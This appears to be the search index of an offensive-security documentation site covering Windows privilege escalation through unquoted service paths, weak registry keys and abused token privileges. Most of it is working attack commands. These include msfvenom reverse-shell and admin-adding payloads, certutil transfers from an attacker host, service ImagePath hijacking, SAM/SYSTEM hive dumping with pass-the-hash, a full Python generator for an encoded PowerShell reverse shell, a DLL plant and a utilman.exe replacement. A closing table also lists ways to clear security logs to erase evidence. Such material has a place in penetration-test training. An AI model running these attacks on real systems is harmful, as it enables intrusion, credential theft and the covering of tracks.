<li> <p>Since the target is a 64-bit OS, host the 64-bit <code>winPEAS</code> binary: <code>python3 -m http.server 8000</code></p> <p></p> </li> <li> <p>Transfer it to the target using <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/winPEASx64.exe winPEASx64.exe</code></p> <p></p> </li> <li> <p>Use the <code>servicesinfo</code> filter to search for unquoted service paths: <code>.\\winPEASx64.exe quiet servicesinfo</code></p> <p></p> <p>Note: In the <code>winPEAS</code> output, red and yellow highlights often indicate important findings such as unquoted service paths. Focus your attention there.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/readme/#understanding-unquoted-service-path-vulnerability","title":"Understanding unquoted service path vulnerability","text":"<p>An unquoted service path vulnerability occurs when a service executable path contains folder names with spaces but lacks quotation marks around the entire path, The issue arises from how Windows interprets service paths. If the path is properly quoted or contains no spaces, the system runs the intended executable without issue. But if it is unquoted and includes spaces, Windows may attempt to execute unintended binaries along the path.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/readme/#breaking-it-down-with-an-example","title":"Breaking it down with an example","text":"<p>If an attacker has write permissions in any of the directories before the actual executable, they can create a malicious binary named after that directory. When the service starts, Windows may execute the attacker binary instead of the intended service executable, leading to privilege escalation, For example, given the intended executable path: <code>C:\\Program Files\\Common Files\\Service Folder\\service.exe</code></p> <ol> <li> <p>First, it checks for <code>C:\\Program.exe</code> <pre><code>C:\\Program.exe\n</code></pre></p> </li> <li> <p>If not found, it checks for <code>C:\\Program Files\\Common.exe</code> <pre><code>C:\\Program Files\\Common.exe\n</code></pre> Note: If this file does not exist, Windows continues.</p> </li> <li> <p>Next, it checks for <code>C:\\Program Files\\Common Files\\Service.exe</code> <pre><code>C:\\Program Files\\Common Files\\Service.exe\n</code></pre> Note: If this file does not exist, Windows continues.</p> </li> <li> <p>Finally, it executes the intended binary: <pre><code>C:\\Program Files\\Common Files\\Service Folder\\service.exe\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Weak-Registry-Permissions/Registry-Enumeration/","title":"Registry Enumeration","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Weak-Registry-Permissions/Registry-Enumeration/#hunting-for-weak-registry-keys-manually","title":"Hunting for Weak Registry Keys Manually","text":"<ol> <li> <p>Hunting for weak registry key permissions with PowerShell <code>Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\* | Format-List | Out-File -FilePath C:\\temp\\SystemServicesACLs.txt</code></p> </li> <li> <p>Transfer the file to your machine for analysis (see the file transfer section). Using Linux commands helps identify outliers more easily: <code>cat SystemServicesACLs.txt | grep -i \"Path\\|Access\\|BUILTIN\\\\\\Users\\|Everyone\\|INTERACTIVE\\|Authenticated Users\" | grep -v \"ReadKey\" | grep -B 1 -i \"Authenticated Users|\\BUILTIN\\\\\\Users\\|Everyone\\|INTERACTIVE\\|FullControl\\|Modify\\|Write\"</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Weak-Registry-Permissions/Registry-Enumeration/#hunting-for-weak-registry-keys-with-winpeas","title":"Hunting for Weak Registry Keys with WinPEAS","text":"<ol> <li> <p>Host winPEAS on a Python HTTP server (64-bit) <code>python3 -m http.server 8000</code> Note: We confirmed the target is a 64-bit machine with: <code>systeminfo | findstr /B /C:\"System Type\"</code></p> </li> <li> <p>Transfer winPEAS to the target using certutil <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/winPEASx64.exe winPEASx64.exe</code> </p> </li> <li> <p>Run winPEAS to search for weak registry permissions <code>.\\winPEASx64.exe</code> Note: <code>FullControl</code> and <code>TakeOwnership</code> privileges can be exploited to abuse weak registry permissions.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Weak-Registry-Permissions/Registry-Enumeration/#enumerating-the-weak-service-registry-key","title":"Enumerating the Weak Service Registry Key","text":"<ol> <li> <p>Enumerate the service with cmd.exe <code>reg query \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\regsvc\"</code> </p> </li> <li> <p>Enumerate the service with PowerShell <code>Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\regsvc' | Select-Object *</code> </p> </li> </ol> <p>Service Start Types: </p> <pre><code> Start 0: Boot Start \u2013 Loaded by the OS loader before other services.\n\n Start 1: System Start \u2013 Started during system boot.\n\n Start 2: Automatic Start \u2013 Started automatically by the Service Control Manager at startup.\n\n Start 3: Manual Start \u2013 Must be started manually by a user or application.\n\n Start 4: Disabled \u2013 Service is disabled and will not start.\n</code></pre> <ol> <li> <p>Verify permissions with icacls <code>icacls \"C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe\"</code> <code>icacls \"C:\\Program Files\\Insecure Registry Service\"</code> </p> </li> <li> <p>Check effective permissions    We typically find the user lacks <code>(F)</code>, <code>(M)</code>, or <code>(W)</code> permissions, preventing modification of the binary. </p> </li> <li> <p>Modify the registry key ImagePath if permissions allow <code>Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl</code></p> <p></p> <p><code>whoami /groups</code></p> <p></p> <p>Note: The output confirms the user is part of the \"NT AUTHORITY\\INTERACTIVE\" group, which has FullControl permissions on the regsvc registry key, allowing exploitation of weak registry key permissions.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Weak-Registry-Permissions/Registry-Exploitation/","title":"Registry Exploitation","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Weak-Registry-Permissions/Registry-Exploitation/#exploiting-insecure-service-with-metasploit","title":"Exploiting Insecure Service with Metasploit","text":"<ol> <li> <p>Create a binary to add a user to the Administrators group with msfvenom <code>msfvenom -p windows/x64/exec CMD='net localgroup Administrators [USERNAME] /add' -f exe &gt; hackfast.exe</code> </p> </li> <li> <p>Host the binary using a Python HTTP server and transfer it to the target machine with certutil <code>certutil -urlcache -f http://[IP-ADDRESS]:8001/hackfast.exe hackfast.exe</code> </p> </li> <li> <p>Change the ImagePath on the regsvc service registry key to point to the malicious executable <code>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc\" /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\hackfast.exe /f</code> </p> <p>Note: Verify if ImagePath was set properly with the following command: <code>reg query \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\regsvc\"</code></p> </li> <li> <p>Run <code>net start regsvc</code> on the target to execute the exploit </p> <p>Note: If <code>SeShutdownPrivilege</code> is enabled, reboot to have the service restart automatically <code>shutdown /r /t 0</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Weak-Registry-Permissions/Registry-Exploitation/#generating-reverse-shell-with-msfvenom","title":"Generating Reverse Shell with msfvenom","text":"<ol> <li> <p>Create a reverse shell binary with msfvenom <code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=[ATTACKER-IP] LPORT=[PORT] -o hackfast.exe</code> </p> </li> <li> <p>Host the binary using a Python HTTP server and transfer it to the target machine with certutil <code>certutil -urlcache -f http://[IP-ADDRESS]:8001/hackfast.exe hackfast.exe</code> </p> </li> <li> <p>Change the ImagePath on the regsvc service registry key to point to the malicious executable <code>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc\" /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\hackfast.exe /f</code> Note: Verify if ImagePath was set properly with the following command:    <code>reg query \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\regsvc\"</code></p> </li> <li> <p>Start a listener on the attacking machine <code>msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT [PORT]; run\"</code> </p> </li> <li> <p>Run <code>net start regsvc</code> on the target machine to execute the exploit Note: If <code>SeShutdownPrivilege</code> is enabled, reboot to have the service restart automatically <code>shutdown /r /t 0</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeBackupPrivilege-SeRestorePrivilege/","title":"SeBackupPrivilege/SeRestorePrivilege","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeBackupPrivilege-SeRestorePrivilege/#introduction","title":"Introduction","text":"<p><code>SeBackupPrivilege</code> allows a user to back up files and directories. This privilege grants the ability to traverse any folder and list its contents, even if the user is not explicitly listed in the folder\u2019s Access Control List (ACL).  </p> <p>It is commonly assigned to service accounts for backup purposes, but during a penetration test it can be abused for privilege escalation.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeBackupPrivilege-SeRestorePrivilege/#step-1-check-current-user-privileges","title":"Step 1: Check current user privileges","text":"<ol> <li> <p>Check if the current user has <code>SeBackupPrivilege</code>: <code>whoami /priv</code> </p> <p></p> <p>Note: If it is not enabled, proceed to Step 2.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeBackupPrivilege-SeRestorePrivilege/#step-2-enable-sebackupprivilege-optional","title":"Step 2: Enable SeBackupPrivilege (optional)","text":"<ol> <li> <p>Download the EnableAllTokenPrivs.ps1 script: <code>wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1</code> </p> <p></p> <p>Note: Host the script with Python: <code>python -m http.server 80</code></p> </li> <li> <p>Transfer the script to the target machine with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1</code> </p> <p></p> </li> <li> <p>Import the script to enable the privilege: <code>Import-Module .\\EnableAllTokenPrivs.ps1</code></p> </li> <li> <p>Verify that <code>SeBackupPrivilege</code> is now enabled: <code>whoami /priv</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeBackupPrivilege-SeRestorePrivilege/#step-3-exploit-backup-sam-system","title":"Step 3: Exploit \u2014 backup SAM &amp; SYSTEM","text":"<ol> <li> <p>Save the registry hives: <pre><code>reg save hklm\\system system.hive\nreg save hklm\\sam sam.hive\n</code></pre></p> <p></p> </li> <li> <p>Transfer <code>sam.hive</code> and <code>system.hive</code> to the attacker machine (e.g., via SMB), then extract credentials with impacket-secretsdump: <code>impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code> </p> <p></p> </li> <li> <p>Use the Administrator NTLM hash to perform a Pass-the-Hash attack and gain SYSTEM access: <code>impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a administrator@[IP-ADDRESS]</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeDebugPrivilege/","title":"SeDebugPrivilege","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeDebugPrivilege/#introduction","title":"Introduction","text":"<p>A 2008 blog post on devblogs.microsoft.com titled \u201cIf you grant somebody SeDebugPrivilege, you gave away the farm\u201d highlights the risk of this privilege, A user with <code>SeDebugPrivilege</code> can debug any process, including those running as SYSTEM. This allows code injection into privileged processes, effectively granting full control over the system.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeDebugPrivilege/#exploiting-sedebugprivilege-via-meterpreter-migrate","title":"Exploiting SeDebugPrivilege via Meterpreter migrate","text":"<ol> <li> <p>Generate a payload with <code>msfvenom</code>: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=9001 -f exe -o rev.exe</code> </p> <p></p> <p>Note: Host the payload using Python: <code>python -m http.server 80</code></p> </li> <li> <p>Transfer the binary to the target using <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:80/rev.exe rev.exe</code> </p> <p></p> </li> <li> <p>Set up a Metasploit handler: <code>msfconsole -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9001; run\"</code> </p> <p></p> </li> <li> <p>Execute the payload on the target: <code>.\\rev.exe</code> </p> <p></p> </li> <li> <p>Identify a SYSTEM process (e.g., <code>winlogon.exe</code>): <code>ps winlogon</code> </p> <p></p> <p>Note: Record the PID of <code>winlogon.exe</code>.</p> </li> <li> <p>Migrate to the SYSTEM process and open a shell: <pre><code>migrate [PID]\nshell\n</code></pre></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeDebugPrivilege/#exploiting-sedebugprivilege-via-psgetsysps1","title":"Exploiting SeDebugPrivilege via psgetsys.ps1","text":"<ol> <li> <p>Download <code>psgetsys.ps1</code>: <code>wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1</code> </p> <p></p> <p>Note: Host the script using Python: <code>python -m http.server 80</code></p> </li> <li> <p>Transfer and import the script on the target: <code>certutil -urlcache -f http://[IP-ADDRESS]:80/psgetsys.ps1 psgetsys.ps1</code> </p> <p></p> <p>Then import it: <code>Import-Module .\\psgetsys.ps1</code></p> </li> <li> <p>Identify a SYSTEM process (e.g., <code>winlogon.exe</code>): <code>(Get-WmiObject Win32_Process -Filter \"Name='winlogon.exe'\").ProcessId</code></p> </li> <li> <p>Generate a Base64-encoded PowerShell reverse shell using the following Python script:</p> <pre><code>#!/usr/bin/env python3\nimport sys, base64\n\ndef help():\n    print(\"USAGE: %s IP PORT\" % sys.argv[0])\n    print(\"Returns reverse shell PowerShell base64 payload for IP:PORT\")\n    exit()\n\ntry:\n    (ip, port) = (sys.argv[1], int(sys.argv[2]))\nexcept:\n    help()\n\npayload = ('$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%d);'\n           '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};'\n           'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'\n           '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'\n           '$sendback = (iex $data 2&gt;&amp;1 | Out-String );'\n           '$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";'\n           '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'\n           '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')\npayload = payload % (ip, port)\n\ncmdline = \"powershell -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\nprint(cmdline)\n</code></pre> </li> <li> <p>Run the script to generate the payload: <code>python3 revshell.py 10.11.92.52 9002</code> </p> <p></p> </li> <li> <p>Impersonate and execute a command with SYSTEM privileges: <pre><code>ImpersonateFromParentPid -ppid 548 -command \"c:\\windows\\system32\\cmd.exe\" -cmdargs \"/c powershell -e [BASE64-ENCODED-COMMAND]\"\n</code></pre></p> </li> <li> <p>If you encounter Error 122: ERROR_INSUFFICIENT_BUFFER, the payload is too long. Use shorter commands or split the payload. For example: <pre><code>ImpersonateFromParentPid -ppid 548 -command \"c:\\windows\\system32\\cmd.exe\" -cmdargs \"/c ping [IP-ADDRESS]\"\n</code></pre></p> </li> <li> <p>Run <code>psgetsys.ps1</code> again with the proper payload to gain SYSTEM: <pre><code>ImpersonateFromParentPid -ppid 548 -command \"c:\\windows\\system32\\cmd.exe\" -cmdargs \"/c powershell -e [BASE64-ENCODED-COMMAND]\"\n</code></pre></p> </li> <li> <p>Set up a Netcat listener to catch the shell: <code>rlwrap -cAr nc -lnvp 9002</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeImpersonatePrivilege-SeAssignPrimaryTokenPrivilege/","title":"SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeImpersonatePrivilege-SeAssignPrimaryTokenPrivilege/#introduction","title":"Introduction","text":"<p>Service accounts are often configured with <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code>. These allow an account to impersonate the access tokens of other users, including the SYSTEM user.</p> Important <p>Juicy Potato does not work on Windows 10 version 1809 or later, nor on Server 2019. For Server 2016, Server 2019, and Windows 10 (1607 onwards), use PrintSpoofer.exe instead.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeImpersonatePrivilege-SeAssignPrimaryTokenPrivilege/#exploiting-privileges-with-juicy-potato","title":"Exploiting privileges with Juicy Potato","text":"<p>Rotten Potato was a limited exploit. Juicy Potato improves on it by leveraging more CLSIDs and methods of exploitation. (The following example uses Windows 7.)</p> <ol> <li> <p>Verify that the current user has <code>SeImpersonatePrivilege</code>: <code>whoami /priv</code> </p> <p></p> </li> <li> <p>Download <code>JuicyPotato.exe</code> from GitHub: <code>curl -L -o JuicyPotato.exe https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</code> </p> <p></p> <p>Note: This binary is 64-bit. A 32-bit version is available here.</p> </li> <li> <p>Determine the OS version and build: <code>systeminfo | findstr /B /C:\"Host Name\" /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Hotfix(s)\"</code> </p> <p></p> </li> <li> <p>Example: Windows 10 Professional, Build 10586 \u2192 Version 1511.     Since 1511 &lt; 1809, the machine is potentially vulnerable if not patched.  </p> <p></p> </li> <li> <p>Generate a reverse shell executable using <code>msfvenom</code> (or use <code>nc.exe</code>): <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1234 -a x64 --platform Windows -f exe -o shell.exe</code> </p> <p></p> </li> <li> <p>Transfer <code>JuicyPotato.exe</code> and <code>shell.exe</code> to the target (see File Transfer section for techniques).  </p> <p></p> </li> <li> <p>Test the exploit by redirecting output to a file: <pre><code>C:\\Users\\Public\\Downloads\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami &gt; C:\\Users\\Public\\Downloads\\output.txt\" -t *\n</code></pre></p> <p></p> </li> <li> <p>Start a Netcat listener and execute the reverse shell via Juicy Potato: <pre><code>C:\\Users\\Public\\Downloads\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c C:\\Users\\Public\\Downloads\\shell.exe\" -t *\n</code></pre></p> <p></p> </li> <li> <p>If successful, you\u2019ll receive a SYSTEM shell on the listener: <code>sudo rlwrap -cAr nc -lvnp 1234</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeImpersonatePrivilege-SeAssignPrimaryTokenPrivilege/#impersonating-the-local-system-account-with-printspoofer","title":"Impersonating the LOCAL SYSTEM account with PrintSpoofer","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/","title":"SeManageVolumePrivilege","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/#step-1-check-current-user-privileges","title":"Step 1: Check current user privileges","text":"<ol> <li> <p>Verify if the current user has <code>SeManageVolumePrivilege</code>: <code>whoami /priv</code> </p> <p></p> <p>Note: If it is not enabled, proceed to Step 2.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/#step-2-enable-semanagevolumeprivilege-optional","title":"Step 2: Enable SeManageVolumePrivilege (optional)","text":"<ol> <li> <p>Download the <code>EnableAllTokenPrivs.ps1</code> script: <code>wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1</code> </p> <p></p> <p>Note: Host the script with Python: <code>python -m http.server 80</code></p> </li> <li> <p>Transfer the script to the target machine: <code>certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1</code> </p> <p></p> </li> <li> <p>Import the module to enable the privilege: <code>Import-Module .\\EnableAllTokenPrivs.ps1</code></p> </li> <li> <p>Verify privileges again to confirm that <code>SeManageVolumePrivilege</code> is enabled: <code>whoami /priv</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/#dll-hijacking-with-metasploit","title":"DLL hijacking with Metasploit","text":"<ol> <li> <p>Download and transfer <code>SeManageVolumeExploit.exe</code> to the target: <code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe</code> </p> <p></p> <p>Note: Host the file with Python: <code>python -m http.server 80</code></p> </li> <li> <p>Transfer it using <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:80/SeManageVolumeExploit.exe SeManageVolumeExploit.exe</code> </p> <p></p> </li> <li> <p>Execute the exploit to gain write privileges to <code>C:\\Windows\\System32\\</code>:  </p> <p></p> </li> <li> <p>Create a malicious DLL payload with <code>msfvenom</code>: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll</code> </p> <p></p> <p>Note: Host with Python and transfer with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:80/tzres.dll tzres.dll</code> </p> <p></p> </li> <li> <p>Place the malicious DLL in the WBEM directory: <code>copy tzres.dll C:\\Windows\\System32\\wbem\\</code></p> </li> <li> <p>Set up a Netcat listener on the attacking machine: <code>rlwrap -cAr nc -lnvp 1337</code> </p> <p></p> <p>Note: Running <code>systeminfo</code> will trigger the payload.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/#exploit-with-wertrigger","title":"Exploit with WerTrigger","text":"<ol> <li> <p>Download and transfer <code>SeManageVolumeExploit.exe</code> to the target: <code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe</code> </p> <p></p> <p>Note: Host the file with Python: <code>python -m http.server 80</code></p> </li> <li> <p>Execute the exploit to gain write privileges to <code>C:\\Windows\\System32\\</code>:  </p> <p></p> </li> <li> <p>Download required files: <pre><code>wget https://github.com/sailay1996/WerTrigger/raw/master/bin/WerTrigger.exe\nwget https://github.com/sailay1996/WerTrigger/raw/master/bin/phoneinfo.dll\nwget https://raw.githubusercontent.com/sailay1996/WerTrigger/master/bin/Report.wer\ncp /usr/share/windows-resources/binaries/nc.exe .\n</code></pre></p> <p></p> <p>Note: Host them with Python: <code>python -m http.server 80</code></p> </li> <li> <p>Transfer files to the target using <code>certutil</code>: <pre><code>certutil -urlcache -f http://[IP-ADDRESS]:80/WerTrigger.exe WerTrigger.exe\ncertutil -urlcache -f http://[IP-ADDRESS]:80/phoneinfo.dll phoneinfo.dll\ncertutil -urlcache -f http://[IP-ADDRESS]:80/nc.exe nc.exe\ncertutil -urlcache -f http://[IP-ADDRESS]:80/Report.wer Report.wer\n</code></pre></p> <p></p> </li> <li> <p>Copy <code>phoneinfo.dll</code> to <code>C:\\Windows\\System32\\</code>, place <code>Report.wer</code> and <code>WerTrigger.exe</code> in the same directory, then run <code>WerTrigger.exe</code>:  </p> <p></p> <p>Note: <code>WerTrigger.exe</code> produces no output; it waits for instructions.</p> </li> <li> <p>At this point, you should have SYSTEM-level access on the target machine.  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/","title":"SeTakeOwnershipPrivilege","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/#introduction","title":"Introduction","text":"<p><code>SeTakeOwnershipPrivilege</code> grants a user the ability to take ownership of any securable object such as Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes, This privilege assigns <code>WRITE_OWNER</code> rights, allowing the user to change the owner within the object\u2019s security descriptor. While administrators have this privilege by default, it can also be granted to service accounts for specific tasks.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/#step-1-enabling-setakeownershipprivilege","title":"Step 1: Enabling SeTakeOwnershipPrivilege","text":"<ol> <li> <p>Verify if the current user has <code>SeTakeOwnershipPrivilege</code>: <code>whoami /priv</code> </p> <p></p> </li> <li> <p>Download the EnableAllTokenPrivs.ps1 script: <code>wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1</code> </p> <p></p> </li> <li> <p>Transfer the script to the target machine: <code>certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1</code> </p> <p></p> </li> <li> <p>Import the script to enable the privilege: <code>Import-Module .\\EnableAllTokenPrivs.ps1</code></p> </li> <li> <p>Verify that <code>SeTakeOwnershipPrivilege</code> is enabled: <code>whoami /priv</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/#step-2-choosing-a-target-file","title":"Step 2: Choosing a target file","text":"<ol> <li> <p>Identify a target file to take ownership of. In this example: <code>C:\\Secrets\\cred.txt</code>: <code>Get-ChildItem -Path 'C:\\Secrets\\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name=\"Owner\";Expression={ (Get-Acl $_.FullName).Owner }}</code> </p> <p></p> </li> <li> <p>Check the ownership of the directory: <code>cmd /c dir /q 'C:\\Secrets'</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/#step-3-taking-ownership-of-the-file","title":"Step 3: Taking ownership of the file","text":"<ol> <li> <p>Change ownership of the file: <code>takeown /f 'C:\\Secrets\\cred.txt'</code> </p> <p></p> </li> <li> <p>Confirm the ownership change: <code>Get-ChildItem -Path 'C:\\Secrets\\cred.txt' | select name,directory,@{Name=\"Owner\";Expression={(Get-ACL $_.Fullname).Owner}}</code> </p> <p></p> </li> <li> <p>Grant your account full control with <code>icacls</code>: <code>icacls 'C:\\Secrets\\cred.txt' /grant hackfast:F</code> </p> <p></p> <p>Note: Verify access by reading the file: <code>cat 'C:\\Secrets\\cred.txt'</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeTakeOwnershipPrivilege/#exploiting-with-utilman","title":"Exploiting with Utilman","text":"<ol> <li> <p>Since <code>Utilman.exe</code> runs with SYSTEM privileges, replacing it allows privilege escalation.     Check its current permissions: <code>icacls \"C:\\Windows\\System32\\Utilman.exe\"</code> </p> <p></p> </li> <li> <p>Take ownership of <code>utilman.exe</code>: <code>takeown /f C:\\Windows\\System32\\Utilman.exe</code> </p> <p></p> <p>Note: Ownership alone doesn\u2019t grant access. However, the owner can assign new permissions.</p> </li> <li> <p>Grant full control over <code>utilman.exe</code>: <pre><code>icacls C:\\Windows\\System32\\Utilman.exe /grant hackfast:F\nicacls \"C:\\Windows\\System32\\Utilman.exe\"\n</code></pre></p> <p></p> </li> <li> <p>Replace <code>utilman.exe</code> with <code>cmd.exe</code> (backup the original first, if possible): <code>copy cmd.exe utilman.exe</code> </p> <p></p> </li> <li> <p>Lock the screen from the Start menu:  </p> <p></p> </li> <li> <p>Click the Ease of Access button.     Since <code>utilman.exe</code> was replaced with <code>cmd.exe</code>, a command prompt opens with SYSTEM privileges:  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/readme/#what-are-tokens","title":"What are tokens?","text":"<p>Tokens are temporary keys that allow access to a system or network without re-entering credentials each time. Think of them as \u201ccookies for computers.\u201d</p> Privilege Impact Execution SeAssignPrimaryToken Admin + Use tools like <code>potato.exe</code>, RottenPotato, or JuicyPotato to impersonate tokens and escalate to NT SYSTEM. + Leverage token manipulation with tools like PrintSpoofer or RogueWinRM. SeAudit Threat + Write events to the Security event log using the <code>AuthzReportSecurityEvent</code> API to manipulate or overwrite logs. + Generate misleading events to hinder forensic analysis. SeBackup Admin + Backup registry hives such as <code>HKLM\\SAM</code> and <code>HKLM\\SYSTEM</code> to extract local account hashes. + Reuse hashes for Pass-the-Hash attacks. + Read sensitive files while bypassing normal access controls. SeCreateToken Admin + Create arbitrary tokens with elevated privileges (e.g., local admin) using system APIs. + Use token crafting to escalate privileges. SeDebug Admin + Duplicate tokens of sensitive processes (e.g., <code>lsass.exe</code>) using debugging privileges. + Interact with <code>lsass.exe</code> to extract credentials. SeImpersonate Admin + Use Potato exploits, RogueWinRM, or PrintSpoofer to create a process under another user\u2019s context by impersonating their token. SeLoadDriver Admin + Load a vulnerable kernel driver to escalate privileges. + Unload security-related drivers to weaken protections. SeRestore Admin + Abuse this privilege to manipulate system files. + Replace binaries such as <code>utilman.exe</code> with <code>cmd.exe</code> to gain SYSTEM-level shells. + Replace service executables to maintain persistence. SeSecurity Threat + Clear or shrink Security event logs to erase evidence. + Read logs for insights into system activity. + Flood with events to purge older entries. + Modify object SACLs to change auditing. SeShutdown Availability + Shut down the system to disrupt availability. + Trigger BSOD and generate crash dumps for analysis. SeTakeOwnership Admin + Take ownership of sensitive files or directories. + Modify ACLs to gain full access. + Replace system binaries (e.g., swap <code>cmd.exe</code> for <code>utilman.exe</code>). 